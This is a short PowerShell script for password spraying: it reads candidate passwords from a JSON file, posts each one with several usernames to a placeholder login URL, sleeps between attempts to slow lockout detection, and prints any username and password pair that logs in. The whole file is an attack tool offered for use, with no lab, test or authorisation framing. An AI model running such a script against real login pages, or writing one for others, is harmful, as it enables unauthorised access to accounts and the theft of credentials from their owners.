# Target Login: https://login.com
$loginUrl = "https://login.com"
$users = @("user1", "user2", "user3")

# Loading passwords from JSON file.
$passwordFilePath = "Json File"
write-host "Loading password package"

# Error handling for file existence
if (-Not (Test-Path -Path $passwordFilePath)) {
    Write-Host "Password file not found at path: $passwordFilePath"
    exit 1
}
# Read the JSON file and convert it to a PowerShell object
$passwordData = Get-Content -Raw -Path $passwordFilePath | ConvertFrom-Json
$passwordsToTry = $passwordData.passwords 
# note the number of passwords loaded
Write-Host "Loaded passwords: $($passwordsToTry.Count)"
################################################
foreach ($password in $passwordsToTry) {
    foreach ($user in $users) {
        $postData = @{
            username = $user
            password = $password
        }
        try {
            $response = Invoke-RestMethod -Uri $loginUrl -Method Post -Body $postData -ContentType "application/json"
            if ($response.content -like "Login successful*") {
                Write-Host "Login successful for user: $user with password: $password" -ForegroundColor Green
            }
            else {
                Write-Host "Login failed for user: $user with password: $password" -ForegroundColor Red
            }
}
        catch {
            Write-Host "Error occurred while trying to login for user: $user with password:"
        }
        start-sleep -Seconds 1
    
    }
    # Optional longer delay between spraying different passwords
    Start-Sleep -Seconds 10
}

Write-Host "[*] Script finished." -ForegroundColor Yellow